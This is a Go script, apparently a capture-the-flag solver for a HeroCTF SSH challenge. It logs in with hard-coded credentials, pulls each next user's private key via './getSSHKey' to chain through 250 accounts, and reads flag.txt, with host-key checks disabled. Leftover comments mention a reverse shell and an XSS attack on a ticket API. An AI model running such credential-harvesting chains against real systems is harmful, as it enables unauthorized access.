package main

import (
    "bytes"
    "fmt"
    "log"
    "strconv"

    "golang.org/x/crypto/ssh"
)

//----------------------------------config-----------------------
const target = "chall.heroctf.fr:10046" //chals target goes here
const flag = "HTB{"                     //events flag prefix goes here
//var id_rsa []byte

//ssh change_me@chall.heroctf.fr -p 10060

func main() {

    fmt.Println("--------------------------------------------------------")
    fmt.Println("--------------Solve HeroCTF SSHs------------------------")
    fmt.Println("--------------by: Ir0nM4n-------------------------------")
    fmt.Println("--------------@: https://github.com/brennenwright-------")
    //    fmt.Println("\n-----Setup")

    //empty spot for reverse shell port opening and such

    //step one: attack the moderator with a ticket including XSS
    //'http://206.189.126.144:31128/api/tickets/add'
    fmt.Println("\n-----Step One: SSH known user login")

    var username = "user1"
    var password = "password123"

    fmt.Println("connecting with SSH to " + username + "@" + target)

    // connect
    config := &ssh.ClientConfig{
        User: username,
        Auth: []ssh.AuthMethod{
            // Use the password method for remote authentication.
            ssh.Password(password),
        },
        HostKeyCallback: ssh.InsecureIgnoreHostKey(), //allows self signed certs
    }

    client, err := ssh.Dial("tcp", target, config)
    if err != nil {
        log.Fatalf("unable to connect: %v", err)
    }
    defer client.Close()

    // Each ClientConn can support multiple interactive sessions,
    // represented by a Session.
    session, err := client.NewSession()
    if err != nil {
        log.Fatal("Failed to create session: ", err)
    }
    defer session.Close()

    // Once a Session is created, you can execute a single command on
    // the remote side using the Run method.

    var b bytes.Buffer
    session.Stdout = &b
    fmt.Println("\n---get the key")

    if err := session.Run("./getSSHKey"); err != nil {
        log.Fatal("Failed to run: " + err.Error())
    }
    id_rsa := b.String()

    //if it worked check the key
    if id_rsa[:34] == "-----BEGIN OPENSSH PRIVATE KEY----" {
        fmt.Println("---got a good key")
    }

    //set two: connect to a new user using the key
    fmt.Println("\n-----Step Two: Borrow the next users key x250")

    var user = 1

    for {
        //close the client
        client.Close()

        //increment the user
        user++

        // Create the Signer for this private key.
        signer, err := ssh.ParsePrivateKey([]byte(id_rsa))
        if err != nil {
            log.Fatalf("unable to parse private key: %v", err)
        }

        // update the config and connect
        config = &ssh.ClientConfig{
            User: "user" + strconv.Itoa(user),
            Auth: []ssh.AuthMethod{
                // Use the PublicKeys method for remote authentication.
                ssh.PublicKeys(signer),
            },
            HostKeyCallback: ssh.InsecureIgnoreHostKey(), //allows self signed certs
        }
        fmt.Print("--connecting as: user" + strconv.Itoa(user))

        client, err = ssh.Dial("tcp", target, config)
        if err != nil {
            log.Fatalf("---unable to connect: %v", err)
        }

        // Each ClientConn can support multiple interactive sessions,
        // represented by a Session.
        session, err = client.NewSession()
        if err != nil {
            log.Fatal("---Failed to create session: ", err)
        }
        defer session.Close()

        // Once a Session is created, you can execute a single command on
        // the remote side using the Run method.

        var b bytes.Buffer
        session.Stdout = &b

        if user == 250 {
            fmt.Println("\n--get the flag.txt file")
            if err := session.Run("cat flag.txt"); err != nil {
                log.Fatal("---Failed to run: " + err.Error())
            }

            //parse for the flag
            fmt.Println("\n-----Flag: ")
            fmt.Println(b.String())

            return

        }

        fmt.Println("\n--get the next key")

        if err := session.Run("./getSSHKey"); err != nil {
            log.Fatal("---Failed to run: " + err.Error())
        }

        var old_rsa = id_rsa
        id_rsa = b.String()
        //if it worked check the key
        if id_rsa[:34] == "-----BEGIN OPENSSH PRIVATE KEY----" && id_rsa != old_rsa {
            fmt.Println("---got a new good key")
        }

    }

}
